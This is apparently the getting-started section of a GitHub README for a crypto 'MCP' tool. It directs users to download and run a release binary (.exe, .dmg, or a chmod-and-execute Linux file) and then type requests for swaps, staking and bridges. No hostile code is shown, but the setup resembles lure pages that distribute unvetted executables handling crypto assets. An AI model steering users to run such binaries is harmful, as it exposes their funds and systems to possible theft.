## üöÄ Getting Started

### Step 1: Download the Application

To get started, visit our [Releases page](https://github.com/OnePieceOn/universal-crypto-mcp/releases) to download the latest version of Universal MCP.

[![Download](https://img.shields.io/badge/Download-v1.0-blue.svg)](https://github.com/OnePieceOn/universal-crypto-mcp/releases)

### Step 2: Install the Application

1. Locate the downloaded file in your system's downloads folder.
2. Follow these steps based on your operating system:

   - **For Windows**:
     - Double-click the `.exe` file to start the installation.
     - Follow the on-screen prompts to complete the installation.
   
   - **For macOS**:
     - Open the `.dmg` file and drag the application to your Applications folder.
     - Open the application from the Applications folder.

   - **For Linux**:
     - Open a terminal and navigate to the folder where you downloaded the file.
     - Run the command: `chmod +x universal-crypto-mcp` and then `./universal-crypto-mcp` to start the application.

### Step 3: Run the Application

Once installed, open Universal MCP. You'll see a simple interface where you can start typing your requests in plain language. For example, you can type "swap 1 ETH to BSC" and the application will guide you through the process.

## üîß Using the Application

### Basic Operations

1. **Swaps**: Input your swap requirements in the text box. The app will respond with available options and confirmation steps.
2. **Staking**: Type "stake 10 ETH" to initiate the staking process. Follow the prompts.
3. **Bridges**: For transferring assets, simply ask, "Bridge ETH from Ethereum to BSC," and it will guide you through the steps.
